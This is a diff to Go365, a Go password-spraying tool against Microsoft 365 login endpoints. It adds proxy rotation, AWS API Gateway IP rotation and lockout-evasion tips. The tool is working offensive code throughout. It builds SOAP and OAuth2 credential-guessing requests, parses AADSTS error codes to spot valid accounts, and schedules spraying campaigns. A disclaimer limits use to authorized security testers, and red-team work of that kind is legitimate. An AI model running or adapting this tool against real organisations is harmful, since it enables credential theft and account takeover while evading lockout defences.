@@ -1,17 +1,21 @@
 /*
 Go365
-authors: h0useh3ad, paveway3, S4R1N, EatonChips
+authors: paveway3, h0useh3ad, S4R1N, EatonChips
 license: MIT
-Copyright 2021 Optiv Inc.
+Copyright: None
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.
+Version 2.0 - Added another endpoint. Fixed proxy logic. Fixed AWS logic (thanks h0useh3ad!!)
 */
+
 package main
+
 import (
 	"bufio"
 	"bytes"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -20,105 +24,91 @@ import (
 	"os"
 	"strings"
 	"time"
-	"encoding/json"
+
 	"github.com/beevik/etree"
 	"github.com/fatih/color"
 	"golang.org/x/net/proxy"
-	//"crypto/tls"                     uncomment when testing through burp + proxifier
+	//"crypto/tls"                     dev: uncomment when testing through burp + proxifier
 )
+
 var (
-	targetURL = ""
-	targetURLrst2 = "https://login.microsoftonline.com/rst2.srf"
+	targetURL      = ""
+	targetURLrst2  = "https://login.microsoftonline.com/rst2.srf"
 	targetURLgraph = "https://login.microsoft.com/common/oauth2/token"
-	debug     = false
+	debug          = false
 )
+
 const (
-	version = "1.4"
+	version = "2.0"
 	tool    = "Go365"
-	authors = "h0useh3ad, paveway3, S4R1N, EatonChips"
+	authors = "paveway3, h0useh3ad, S4R1N, EatonChips"
 	usage   = `Usage:
-
   -h                            Shows this stuff
-
-  Required - Endpoint:   
-
+  Required - Endpoint:			
     -endpoint [rst or graph]    Specify which endpoint to use
-                                : (-endpoint rst)   login.microsoftonline.com/rst2.srf. SOAP XML request with XML response
+                                : (-endpoint rst)   *Classic Go365!* login.microsoftonline.com/rst2.srf. SOAP XML request with XML response
                                 : (-endpoint graph)  login.microsoft.com/common/oauth2/token. HTTP POST request with JSON Response
-
   Required - Usernames and Passwords:
-
     -u <string>                 Single username to test
                                 : Username with or without "@domain.com"
                                 : Must also provide -d flag to specify the domain
-                                : (-u legit.user)
-
+                                : (-u legitfirst.lastname@totesrealdomain.com)
     -ul <file>                  Username list to use (overrides -u)
                                 : File should contain one username per line
                                 : Usernames can have "@domain.com"
                                 : If no domain is specified, the -d domain is used
                                 : (-ul ./usernamelist.txt)
-
     -p <string>                 Password to attempt
                                 : Enclose in single quotes if it contains special characters
                                 : (-p password123)  or  (-p 'p@s$w0|2d')
-
     -pl <file>                  Password list to use (overrides -p)
                                 : File should contain one password per line
                                 : -delay flag can be used to include a pause between each set of attempts
                                 : (-pl ./passwordlist.txt)
-
     -up <file>                  Userpass list to use (overrides all the above options)
                                 : One username and password separated by a ":" per line
                                 : Be careful of duplicate usernames!
                                 : (-up ./userpasslist.txt)
-
   Required/Optional - Domain:
-
     -d <string>                 Domain to test
                                 : Use this if the username or username list does not include "@targetcompany.com"
                                 : (-d targetcompany.com)
-
   Optional:
-
     -w <int>                    Time to wait between attempts in seconds. 
                                 : Default: 1 second. 5 seconds recommended.
                                 : (-w 10)
-
     -delay <int>                Delay (in seconds) between sprays when using a password list.
                                 : Default: 60 minutes (3600 seconds) recommended.
                                 : (-delay 7200)
-
     -o <string>                 Output file to write to
                                 : Will append if file exists, otherwise a file is created
                                 : (-o ./Go365output.out)
-
-    -proxy <string>             Single proxy server to use
+    -proxy <string>             Single SOCKS5 proxy server to use
                                 : IP address and Port separated by a ":"
-                                : Has only been tested using SSH SOCKS5 proxies
+                                : SOCKS5 proxy
                                 : (-proxy 127.0.0.1:1080)
-
-    -proxyfile <string>         A file with a list of proxy servers to use
+    -proxyfile <string>         A file with a list of SOCKS5 proxy servers to use
                                 : IP address and Port separated by a ":" on each line
                                 : Randomly selects a proxy server to use before each request
-                                : Has only been tested using SSH SOCKS5 proxies
                                 : (-proxyfile ./proxyfile.txt)
-
     -url <string>               Endpoint to send requests to
                                 : Amazon API Gateway 'Invoke URL'
-                                : Highly recommended that you use this option.
-                                : (-url https://kg98agrae3.execute-api.us-east-2.amazonaws.com/login)
-
+                                : Highly recommended that you use this option. Google it, or
+                                : check this out: https://bigb0sss.github.io/posts/redteam-rotate-ip-aws-gateway/
+                                : (-url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login)
     -debug                      Debug mode.
                                 : Print xml response
-
  Examples:
   ./Go365 -endpoint rst -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
   ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
   ./Go365 -endpoint rst -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
   ./Go365 -endpoint graph -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
   ./Go365 -endpoint rst -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
-  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login 
+  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login 
+  You can even schedule out your entire password guessing campaign using the -pl and -delay flags :)
+  ./Go365 -endpoint rst -ul ./user_list.txt -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login -proxyfile listofprox.txt -pl listofpasswords.txt -delay 7200
+  
+  *Protip: If you get a lot of "Account locked out" responses, then you might wanna proxy or use an AWS Gateway.
   `
 	banner = `
   ██████         ██████   ██████  ██████
@@ -128,39 +118,75 @@ const (
   ██████   ████  ██████   ██████  ██████
 `
 )
+
 // function to handle wait times
 func wait(wt int) {
 	waitTime := time.Duration(wt) * time.Second
 	time.Sleep(waitTime)
 }
+
 // funtion to randomize the list of proxy servers
 func randomProxy(proxies []string) string {
-	var proxy string
+	var proxyString string
+
+	// selet a random proxy server from the list provided
 	if len(proxies) > 0 {
-		proxy = proxies[rand.Intn(len(proxies))]
+		proxyString = proxies[rand.Intn(len(proxies))]
 	}
-	return proxy
+
+	// We selected a random proxy server, now we test the connection before continuing.
+	// this is for the rst endpoint
+	client := &http.Client{}
+	requestBody := fmt.Sprintf(``)
+	dialSOCKSProxy, err := proxy.SOCKS5("tcp", proxyString, nil, proxy.Direct)
+	if err != nil {
+		fmt.Println("Error connecting to proxy.")
+		os.Exit(1)
+	}
+	tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
+	client = &http.Client{
+		Transport: tr,
+		Timeout:   5 * time.Second,
+	}
+	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
+	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
+	if err != nil {
+		panic(err)
+	}
+	response, err := client.Do(request)
+	if err != nil {
+		color.Set(color.FgRed)
+		fmt.Println("[!] Could not connect to proxy: " + proxyString)
+		proxyString = "bp"
+	}
+	// I have NO IDEA why this works. Literally need to sandwich the defer between the returns. plz send help...
+	return proxyString
+	defer response.Body.Close()
+	return proxyString
+
 }
+
 type flagVars struct {
-	flagHelp              bool
-	flagEndpoint          string
-	flagUsername          string
-	flagUsernameFile      string
-	flagDomain            string
-	flagPassword          string
-	flagPasswordFile      string
-	flagUserPassFile      string
-	flagDelay             int
-	flagWaitTime          int
-	flagProxy             string
-	flagProxyFile         string
-	flagOutFilePath       string
-	flagAWSGatewayURL     string
-	flagDebug             bool
+	flagHelp          bool
+	flagEndpoint      string
+	flagUsername      string
+	flagUsernameFile  string
+	flagDomain        string
+	flagPassword      string
+	flagPasswordFile  string
+	flagUserPassFile  string
+	flagDelay         int
+	flagWaitTime      int
+	flagProxy         string
+	flagProxyFile     string
+	flagOutFilePath   string
+	flagAWSGatewayURL string
+	flagDebug         bool
 }
+
 func flagOptions() *flagVars {
 	flagHelp := flag.Bool("h", false, "")
-	flagEndpoint := flag.String("endpoint", "rst", "")
+	flagEndpoint := flag.String("endpoint", "", "")
 	flagUsername := flag.String("u", "", "")
 	flagUsernameFile := flag.String("ul", "", "")
 	flagDomain := flag.String("d", "", "")
@@ -176,44 +202,47 @@ func flagOptions() *flagVars {
 	flagDebug := flag.Bool("debug", false, "")
 	flag.Parse()
 	return &flagVars{
-		flagHelp:           *flagHelp,
-		flagEndpoint:       *flagEndpoint,
-		flagUsername:       *flagUsername,
-		flagUsernameFile:   *flagUsernameFile,
-		flagDomain:         *flagDomain,
-		flagPassword:       *flagPassword,
-		flagPasswordFile:   *flagPasswordFile,
-		flagUserPassFile:   *flagUserPassFile,
-		flagDelay:          *flagDelay,
-		flagWaitTime:       *flagWaitTime,
-		flagProxy:          *flagProxy,
-		flagProxyFile:      *flagProxyFile,
-		flagOutFilePath:    *flagOutFilePath,
-		flagAWSGatewayURL:  *flagAWSGatewayURL,
-		flagDebug:          *flagDebug,
+		flagHelp:          *flagHelp,
+		flagEndpoint:      *flagEndpoint,
+		flagUsername:      *flagUsername,
+		flagUsernameFile:  *flagUsernameFile,
+		flagDomain:        *flagDomain,
+		flagPassword:      *flagPassword,
+		flagPasswordFile:  *flagPasswordFile,
+		flagUserPassFile:  *flagUserPassFile,
+		flagDelay:         *flagDelay,
+		flagWaitTime:      *flagWaitTime,
+		flagProxy:         *flagProxy,
+		flagProxyFile:     *flagProxyFile,
+		flagOutFilePath:   *flagOutFilePath,
+		flagAWSGatewayURL: *flagAWSGatewayURL,
+		flagDebug:         *flagDebug,
 	}
 }
+
 func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute) {
 	var returnString string
 	var returnColor color.Attribute
 	client := &http.Client{}
-	// Devs - uncomment this code if you want to proxy through burp + proxifier
+	// Devs - uncomment this code if you want to skip cert validation (burp+proxifier)
 	//client := &http.Client{
 	//	Transport: &http.Transport{
 	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
 	//	},
 	//}
+
 	requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
 	// If a proxy was set, do this stuff
 	if prox != "" {
 		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
 		if err != nil {
 			fmt.Println("Error connecting to proxy.")
+			os.Exit(1)
 		}
 		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
 		client = &http.Client{
 			Transport: tr,
-			Timeout:   15 * time.Second,
+			Timeout:   5 * time.Second,
 		}
 	}
 	// Build http request
@@ -283,17 +312,19 @@ func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute
 	}
 	return returnString, returnColor
 }
+
 func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) {
 	var returnString string
 	var returnColor color.Attribute
 	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>` + un + `</wsse:Username><wsse:Password>` + pw + `</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>`)
 	client := &http.Client{}
-	// Devs - uncomment this code if you want to proxy through burp for troubleshooting
+	// Devs - uncomment this code if you want to skip cert validation (burp+proxifier)
 	//client := &http.Client{
 	//	Transport: &http.Transport{
 	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
 	//	},
 	//}
+
 	// Build http request
 	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
 	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
@@ -305,18 +336,19 @@ func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) 
 		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
 		if err != nil {
 			fmt.Println("Error connecting to proxy.")
+			os.Exit(1)
 		}
 		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
 		client = &http.Client{
 			Transport: tr,
-			Timeout:   15 * time.Second,
+			Timeout:   5 * time.Second, //set to 15 when done
 		}
 	}
-	// Send http request
+	//Send http request
 	response, err := client.Do(request)
 	if err != nil {
 		color.Set(color.FgRed)
-		fmt.Println("[!] Could not connect to microsoftonline.com\n")
+		fmt.Println("[!] Could not connect to microsoftonline.com. Check your comms.\n")
 		fmt.Println("[!] Debug info below:")
 		color.Unset()
 		panic(err)
@@ -331,13 +363,13 @@ func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) 
 	xmlResponse := etree.NewDocument()
 	xmlResponse.ReadFromBytes(body)
 	//// Read response codes
-     // looks for the "psf:text" field within the XML response 
+	// looks for the "psf:text" field within the XML response
 	x := xmlResponse.FindElement("//psf:text")
 	if x == nil {
 		returnString = color.GreenString("[rst] [+] Possible valid login! " + un + " : " + pw)
 		// if the "psf:text" field doesn't exist, that means no AADSTS error code was returned indicating a valid login
 	} else if strings.Contains(x.Text(), "AADSTS50059") {
-		// if the domain is not in the directory then exit 
+		// if the domain is not in the directory then exit
 		fmt.Println(color.RedString("[rst] [-] Domain not found in o365 directory. Exiting..."))
 		os.Exit(0) // no need to continue if the domain isn't found
 	} else if strings.Contains(x.Text(), "AADSTS50034") {
@@ -373,6 +405,7 @@ func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) 
 	}
 	return returnString, returnColor
 }
+
 func main() {
 	fmt.Println(color.BlueString(banner))
 	fmt.Println(color.RedString(" Version: ") + version)
@@ -383,6 +416,7 @@ func main() {
 	var passwordList []string
 	var outFile *os.File
 	var err error
+
 	rand.Seed(time.Now().UnixNano())
 	opt := flagOptions()
 	//-h
@@ -395,7 +429,7 @@ func main() {
 		usernameList = append(usernameList, opt.flagUsername)
 	} else if opt.flagUsernameFile == "" && opt.flagUserPassFile == "" {
 		fmt.Printf("%s\n", usage)
-		fmt.Println(color.RedString("Must provide a user. E.g. -u legituser, -ul ./user_list.txt, -up ./userpass_list.txt"))
+		fmt.Println(color.RedString("[!] Must provide a user. E.g. -u legituser, -ul ./user_list.txt, -up ./userpass_list.txt"))
 		os.Exit(0)
 	}
 	// -ul
@@ -421,7 +455,7 @@ func main() {
 		passwordList = append(passwordList, opt.flagPassword)
 	} else if opt.flagPasswordFile == "" && opt.flagUserPassFile == "" {
 		fmt.Printf("%s\n", usage)
-		fmt.Println(color.RedString("Must provide a password to test. E.g. -p 'password123!', -pl ./password_list.txt, -up ./userpass_list.txt"))
+		fmt.Println(color.RedString("[!] Must provide a password to test. E.g. -p 'password123!', -pl ./password_list.txt, -up ./userpass_list.txt"))
 		os.Exit(0)
 	}
 	// -pl
@@ -469,14 +503,14 @@ func main() {
 		domain = fmt.Sprintf("@" + opt.flagDomain)
 	} else if len(usernameList) != 1 || !strings.Contains(usernameList[0], "@") {
 		fmt.Printf("%s\n", usage)
-		fmt.Println(color.RedString("Must provide a domain. E.g. -d testdomain.com"))
+		fmt.Println(color.RedString("[!] Must provide a domain. E.g. -d testdomain.com"))
 		os.Exit(0)
 	}
 	// -proxy
 	if opt.flagProxy != "" {
 		proxyList = append(proxyList, opt.flagProxy)
 
-		fmt.Println(color.GreenString("[!] Optional proxy configured: " + opt.flagProxy))
+		fmt.Println(color.CyanString("[i] Optional proxy configured: " + opt.flagProxy))
 	}
 	// -proxyfile
 	if opt.flagProxyFile != "" {
@@ -493,7 +527,7 @@ func main() {
 		if err := scanner.Err(); err != nil {
 			panic(err)
 		}
-		fmt.Println(color.GreenString("[!] Optional proxy file configured: " + opt.flagProxyFile))
+		fmt.Println(color.CyanString("[i] Optional proxy file configured: " + opt.flagProxyFile))
 	}
 	// -o
 	if opt.flagOutFilePath != "" {
@@ -516,28 +550,41 @@ func main() {
 			color.Unset()
 			panic(err)
 		} else {
-			color.Set(color.FgGreen)
-			fmt.Println("[!] Optional AWS Gateway configured: " + targetURL + "\n")
+			color.Set(color.FgCyan)
+			fmt.Println("[i] Optional AWS Gateway configured: " + targetURL)
 			color.Unset()
 			_ = resp
 		}
 	}
+
 	// -endpoint
-	if opt.flagEndpoint == "rst"{
-		fmt.Println("Using the rst endpoint...")
-		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoftonline.com/rst2.srf")
-		targetURL = targetURLrst2
+	if opt.flagEndpoint == "rst" {
+		color.Set(color.FgCyan)
+		fmt.Println("[i] Using the rst endpoint...")
+		if opt.flagAWSGatewayURL != "" {
+			fmt.Println("[i] Make sure your AWS Gateway (for the -url setting) is pointing to https://login.microsoftonline.com/rst2.srf")
+			targetURL = opt.flagAWSGatewayURL
+		} else {
+			targetURL = targetURLrst2
+		}
 	} else if opt.flagEndpoint == "graph" {
 		targetURL = targetURLgraph
-		fmt.Println("using the graph endpoint...")
-		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoft.com/common/oauth2/token ")
-	} else {
-		fmt.Println("Specify an endpoint (-endpoint rst, or -endpoint graph")
-		fmt.Printf("%s\n", usage)
+		color.Set(color.FgCyan)
+		fmt.Println("[i] Using the graph endpoint...")
+		if opt.flagAWSGatewayURL != "" {
+			fmt.Println("[i] Make sure the your AWS Gateway (for the -url setting) is pointing to https://login.microsoft.com/common/oauth2/token ")
+			targetURL = opt.flagAWSGatewayURL
+		} else {
+			targetURL = targetURLgraph
+		}
+	} else if opt.flagEndpoint == "" {
+		color.Set(color.FgRed)
+		fmt.Println("Specify an endpoint (-endpoint rst, or -endpoint graph)\n Maybe -h would be useful.")
 		os.Exit(0)
 	}
 	// -debug
 	debug = opt.flagDebug
+
 	//// Finally it starts happening
 	// Iterate through passwords
 	for i, pass := range passwordList {
@@ -552,10 +599,21 @@ func main() {
 				pass = passwordList[j]
 			}
 			result := ""
-			// Test username:password combo
+
 			if opt.flagEndpoint == "rst" {
-				result, col := doTheStuffRst(user, pass, randomProxy(proxyList))
-				// Print with color
+				proxyInput := ""
+				if opt.flagProxyFile != "" {
+					proxyInput := "bp"
+					for {
+						proxyInput = randomProxy(proxyList)
+						if proxyInput == "bp" {
+							proxyInput = randomProxy(proxyList)
+						} else {
+							break
+						}
+					}
+				}
+				result, col := doTheStuffRst(user, pass, proxyInput)
 				color.Set(col)
 				fmt.Println(result)
 				color.Unset()
@@ -567,21 +625,34 @@ func main() {
 				if j < len(usernameList)-1 {
 					wait(opt.flagWaitTime)
 				}
+
 			} else if opt.flagEndpoint == "graph" {
-				result, col := doTheStuffGraph(user, pass, randomProxy(proxyList))
-				// Print with color
+				proxyInput := ""
+				if opt.flagProxyFile != "" {
+					proxyInput := "bp"
+					for {
+						proxyInput = randomProxy(proxyList)
+						if proxyInput == "bp" {
+							proxyInput = randomProxy(proxyList)
+						} else {
+							break
+						}
+					}
+				}
+				result, col := doTheStuffGraph(user, pass, proxyInput)
 				color.Set(col)
 				fmt.Println(result)
 				color.Unset()
 				// Write to file
 				if opt.flagOutFilePath != "" {
 					outFile.WriteString(result + "\n")
-				}	
+				}
 				// Wait between usernames
 				if j < len(usernameList)-1 {
 					wait(opt.flagWaitTime)
 				}
 			}
+
 			// Write to file
 			if opt.flagOutFilePath != "" {
 				outFile.WriteString(result + "\n")
@@ -597,11 +668,14 @@ func main() {
 		}
 		// Wait between passwords
 		if i < len(passwordList)-1 {
+			color.Set(color.FgCyan)
+			fmt.Println("[i] Delay set. Sleeping for a while (ー。ー) zzz")
 			wait(opt.flagDelay)
+			fmt.Println("[i] Waking up.")
 		}
 	}
 	// Remind user of output file
 	if opt.flagOutFilePath != "" {
-		fmt.Println(color.GreenString("[!] Output file located at: " + opt.flagOutFilePath))
+		fmt.Println(color.GreenString("[i] Output file located at: " + opt.flagOutFilePath))
 	}
 }
